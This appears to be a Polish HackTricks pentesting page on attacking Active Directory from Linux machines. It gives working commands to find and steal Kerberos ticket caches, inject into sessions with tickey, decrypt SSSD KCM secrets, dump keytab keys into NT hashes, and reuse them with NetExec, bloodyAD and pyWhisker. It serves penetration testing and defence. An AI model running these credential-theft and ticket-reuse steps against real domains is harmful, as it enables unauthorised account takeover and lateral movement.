# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Maszyna z systemem Linux również może działać w środowisku Active Directory.

Maszyna z systemem Linux w środowisku AD może **lokalnie przechowywać materiały Kerberos**: pamięci podręczne użytkowników (ccache), keytaby maszyn/usług oraz sekrety zarządzane przez SSSD. Tych artefaktów można zwykle używać ponownie tak jak innych poświadczeń Kerberos. Aby odczytać większość z nich, musisz być użytkownikiem będącym właścicielem biletu lub **rootem** na maszynie.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeracja

### Enumeracja AD z systemu Linux

Jeśli masz dostęp do AD z systemu Linux (lub do bash w systemie Windows), możesz spróbować użyć [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn), aby przeprowadzić enumerację AD.

Możesz też sprawdzić następującą stronę, aby poznać **inne sposoby enumeracji AD z systemu Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA to open-source’owa **alternatywa** dla Microsoft Windows **Active Directory**, przeznaczona głównie dla środowisk **Unix**. Łączy kompletny **katalog LDAP** z centrum dystrybucji kluczy MIT **Kerberos**, umożliwiając zarządzanie podobne do tego w Active Directory. Wykorzystuje **Certificate System** Dogtag do zarządzania certyfikatami CA i RA oraz obsługuje uwierzytelnianie **wieloskładnikowe**, w tym za pomocą kart inteligentnych. SSSD jest zintegrowany z procesami uwierzytelniania w systemie Unix.<sup>[[14]](#references)[[15]](#references)</sup> Więcej informacji znajdziesz na stronie:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakty hosta dołączonego do domeny

Zanim zajmiesz się biletami, ustal, **w jaki sposób host został dołączony do AD** i **gdzie faktycznie przechowywane są materiały Kerberos**. Na współczesnych hostach z systemem Linux obsługują to zazwyczaj `realmd` + `adcli` + `sssd`, a nie tylko zwykłe pliki w `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

To szybko pokazuje, czy host ufa AD, czy SSSD buforuje tożsamości lub bilety oraz czy dostępne są **keytaby maszynowe/usługowe** lub **sekrety KCM**, które można wykorzystać do nadużyć.<sup>[[4]](#references)[[10]](#references)</sup>

Traktuj `/var/lib/sss/db/cache_*.ldb` osobno od Kerberos ccache i `/var/lib/sss/secrets/secrets.ldb`. Pliki `cache_*.ldb` mogą zawierać weryfikatory haseł offline, gdy domena ma ustawione `cache_credentials = true` **i** użytkownik wcześniej uwierzytelnił się na tym hoście. Zwykle można je odczytać tylko z uprawnieniami uprzywilejowanymi. Sam plik cache lub włączone ustawienie nie dowodzi, że dostępne jest użyteczne, aktualne hasło; przed wyciągnięciem takiego wniosku sprawdź efektywne ustawienie dla domeny oraz faktycznie buforowane tożsamości. Zobacz [dokumentację Red Hat dotyczącą cache poświadczeń SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). W przypadku odrębnej granicy tożsamości między Linux a AD znaczenie ma [mapowanie nazw Kerberos w środowiskach mieszanych dostawców](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) tylko wtedy, gdy usługa akceptuje bilet i mapuje jego principal na odpowiednie konto Unix.

Na hoście z `ksu` prawidłowy principal Kerberos może uzyskać dostęp do **lokalnego konta docelowego**, w tym root, tylko wtedy, gdy to konto autoryzuje ten principal. [Dokumentacja MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) opisuje pliki `.k5login` i `.k5users` w katalogu domowym konta docelowego oraz mapowanie nazw stosowane w przypadku braku obu plików. `.k5users` może również ograniczać dozwolone polecenia dla `ksu -e`; sama nazwa pliku nie dowodzi możliwości uzyskania dostępu do powłoki. Sprawdź dokładne konto docelowe, właściciela i uprawnienia plików, czytelne wpisy autoryzacyjne, dostępne poświadczenia Kerberos oraz efektywne reguły mapowania. Jeśli katalog domowy root jest niedostępny, stan autoryzacji pozostaje nieznany. Pasywne rozpoznanie powinno wyświetlać te ścieżki i uprawnienia bez żądania biletów ani uruchamiania `ksu`.

Zaplanowana kopia zapasowa może pośrednio utworzyć granicę autoryzacji `.k5login`. Jeśli konto o wyższych uprawnieniach rekurencyjnie kopiuje katalog, do którego użytkownik o niższych uprawnieniach ma prawo zapisu, do własnego katalogu domowego, sprawdź, czy kopia obejmuje pliki ukryte, czy ścieżka docelowa jest efektywnym katalogiem domowym konta oraz czy wynikowy plik ma właściciela akceptowanego przez usługę logowania Kerberos. Na przykład [dokumentacja rsync](https://download.samba.org/pub/rsync/rsync.1.html) wskazuje, że `-a --no-owner` powoduje, iż nowe pliki docelowe należą do użytkownika odbierającego. [Dokumentacja MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/user/user_config/k5login.html) opisuje, jak principal w pliku `.k5login` tego użytkownika może autoryzować dostęp. Potwierdź tożsamość RunAs zadania, prawo zapisu do źródła, efektywne opcje rsync, logowanie z włączonym GSSAPI oraz prawidłowy bilet dla wymienionego principal; sam katalog źródłowy z prawem zapisu ani zaplanowane polecenie rsync nie dowodzą istnienia tej ścieżki.

Czytelny keytab również wymaga analizy dla konkretnego principal. Keytab zawierający principal o nazwie sugerującej uprawnienia administracyjne sam w sobie nie dowodzi praw administracyjnych: [polityka `kadm5.acl` w KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) określa dozwolone operacje principal. Zanim uznasz dostęp do keytabu za ścieżkę do root, osobno sprawdź principal, efektywną listę ACL oraz autoryzację lokalnego `ksu` lub logowania. Pasywna weryfikacja może wyświetlić ścieżkę keytabu i uprawnienia bez używania zawartych w nim kluczy ani kontaktowania się z KDC.

## Praca z biletami

### Pass The Ticket

Na tej stronie znajdziesz różne miejsca, w których możesz **znaleźć bilety Kerberos na hoście Linux**. Na następnej stronie dowiesz się, jak przekształcić bilety w formacie CCache do formatu Kirbi (formatu potrzebnego w Windows), a także jak przeprowadzić atak PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Jeśli interesują Cię **procedury pozyskiwania biletów specyficzne dla Linuxa** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` itd.), odwiedź dedykowaną stronę:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponowne użycie biletu CCACHE z /tmp

Pliki CCACHE to formaty binarne służące do **przechowywania poświadczeń Kerberos**. `FILE:/tmp/krb5cc_%{uid}` nadal jest powszechnie używany, ale współczesne wdrożenia Linuxa korzystają również z `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` lub `KCM:%{uid}`. Zanim założysz, że bilety znajdują się w `/tmp`, sprawdź zmienną środowiskową **`KRB5CCNAME`** oraz ustawienie `default_ccache_name`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Ponowne użycie biletu CCACHE z keyring

**Bilety Kerberos przechowywane w pamięci procesu można wyodrębnić**, szczególnie gdy ochrona ptrace jest wyłączona (`/proc/sys/kernel/yama/ptrace_scope`). Przydatne narzędzie do tego celu można znaleźć pod adresem [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Ułatwia ono wyodrębnianie przez wstrzykiwanie kodu do sesji i zrzucanie biletów do `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Aby skonfigurować i użyć tego narzędzia, wykonaj poniższe kroki:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Ta procedura podejmie próbę wstrzyknięcia do różnych sesji, a powodzenie zasygnalizuje przez zapisanie wyodrębnionych ticketów w `/tmp` zgodnie z konwencją nazewnictwa `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Ponowne użycie ticketów CCACHE z SSSD KCM

SSSD przechowuje kopię bazy danych pod ścieżką `/var/lib/sss/secrets/secrets.ldb`. Odpowiadający jej klucz jest zapisany w ukrytym pliku pod ścieżką `/var/lib/sss/secrets/.secrets.mkey`. Domyślnie klucz jest dostępny do odczytu tylko dla użytkowników z uprawnieniami **root**.<sup>[[4]](#references)</sup>

Uruchomienie **`SSSDKCMExtractor`** z parametrami --database i --key spowoduje przeanalizowanie bazy danych i **odszyfrowanie sekretów**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor wyświetla surowe payloady JSON Kerberos; przed operacjami pass-the-cache/pass-the-ticket przekonwertuj je do użytecznej pamięci podręcznej biletów lub innego formatu biletów.<sup>[[4]](#references)</sup>

### Szybka analiza keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Wyodrębnianie kont z /etc/krb5.keytab

Klucze kont usług, niezbędne do działania usług z uprawnieniami root, są bezpiecznie przechowywane w plikach **`/etc/krb5.keytab`**. Klucze te, pełniące funkcję haseł usług, wymagają ścisłej ochrony poufności.<sup>[[5]](#references)</sup>

Do sprawdzenia zawartości pliku keytab można użyć **`klist`**. W systemie Linux polecenie `klist -k -K -e` wyświetla principal, numery wersji kluczy, typy szyfrowania oraz surowy materiał klucza. Jeśli typ klucza to **23 / RC4-HMAC**, jego wartość jest również **hashem NT** danego principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Dla użytkowników Linuksa **`KeyTabExtract`** umożliwia wyodrębnienie hashy RC4 HMAC, które można wykorzystać do ponownego użycia hashy NTLM. Pamiętaj, że jest to możliwe tylko wtedy, gdy keytab nadal zawiera materiał **etype 23 / RC4-HMAC**. W środowiskach używających wyłącznie **AES** może nie dać się uzyskać hashy NT nadających się do ponownego użycia, ale nadal można uwierzytelniać się bezpośrednio za pomocą keytab przez Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

W systemie macOS **`bifrost`** służy do analizy plików keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Korzystając z wyodrębnionych informacji o kontach i hashach, można nawiązywać połączenia z serwerami za pomocą narzędzi takich jak **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Ponowne użycie konta maszyny z `/etc/krb5.keytab`

W systemach dołączonych do domeny za pomocą `realmd`/`adcli`/`sssd` plik `/etc/krb5.keytab` zwykle zawiera **konto komputera** oraz jeden lub więcej **principalów hosta/usługi**. Jeśli masz uprawnienia **root**, nie zrzucaj po prostu jego zawartości: użyj jednego z principalów wymienionych przez `klist -k`, aby zażądać TGT i działać jako sam host Linux.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Jest to szczególnie przydatne, gdy **obiekt komputera** ma delegowane uprawnienia w AD lub gdy host może pobierać inne sekrety, takie jak **gMSA**.<sup>[[13]](#references)</sup>

### Ponowne wykorzystanie skradzionych danych Kerberos za pomocą narzędzi AD stworzonych z myślą o Linuksie

Mając prawidłowy `ccache` lub użyteczny keytab, możesz działać bezpośrednio na AD **z poziomu Linuksa**, bez wcześniejszego konwertowania wszystkiego do formatów Windows. Wiele nowoczesnych narzędzi natywnie obsługuje `KRB5CCNAME` / uwierzytelnianie Kerberos.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

To dobry pomost między **Linux post-exploitation** a nadużywaniem obiektów AD. Informacje o samych ścieżkach nadużywania obiektów znajdziesz tutaj:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefakty gMSA / Managed Service Account w systemie Linux

Nowsze wdrożenia systemu Linux mogą bezpośrednio korzystać z **Managed Service Accounts** w AD. W praktyce oznacza to, że po przejęciu serwera Linux możesz znaleźć nie tylko keytab hosta, ale też **keytaby specyficzne dla usług**, wygenerowane na podstawie gMSA. Typowe miejsca do sprawdzenia to `/etc/gmsad.conf`, pliki konfiguracyjne specyficzne dla wdrożenia oraz dodatkowe pliki `*.keytab` w katalogu `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

To zapewnia wielokrotnego użytku tożsamość Kerberos dla SPN-ów powiązanych z tym gMSA **bez dotykania żadnego punktu końcowego Windows**.<sup>[[13]](#references)</sup> Informacje o nadużyciach gMSA/dMSA **po stronie domeny** po uzyskaniu wyższych uprawnień w AD znajdziesz tutaj:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Jak zaatakować Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Uzyskiwanie dostępu do AD za pomocą zarządzanego konta usługi – bezpośrednia integracja systemów RHEL z Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Zmienne środowiskowe Kerberos – dokumentacja MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – dokumentacja MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: typy szyfrowania Kerberos RC4-HMAC używane przez Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Używanie Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Odkrywanie domen tożsamości i dołączanie do nich | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Podręcznik użytkownika bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Informacje | dokumentacja FreeIPA](https://www.freeipa.org/About.html)
- [15] [Informacje o wydaniu FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – dokumentacja jądra Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – dokumentacja MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
